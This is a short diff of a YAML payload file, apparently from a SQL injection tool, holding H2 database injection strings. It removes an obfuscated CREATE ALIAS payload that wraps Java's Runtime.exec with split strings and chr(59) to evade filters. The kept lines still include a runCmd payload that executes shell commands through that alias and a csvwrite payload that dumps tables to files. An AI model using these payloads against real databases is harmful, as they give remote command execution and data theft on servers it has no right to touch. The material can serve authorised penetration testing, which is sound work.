@@ -112,11 +112,6 @@ resource:
     # alternative method not used
     callCsvWrite: ; call csvwrite('%s', 'select * from %s')
     dropAlias: ; drop alias exec_cmd
-    # prevent semi-colon incompatible with stack
-    createAlias: |
-      ; CREATE ALIAS exec_cmd AS 'String runCmd(String c) throws Exception {
-         return new String(Runtime.get'||'Runtime().ex'||'ec(c).getInputStream().readAllBytes())'||chr(59)||'
-      }'
     runCmd: select exec_cmd('%s')||'${trail_sql}'
   
   file:
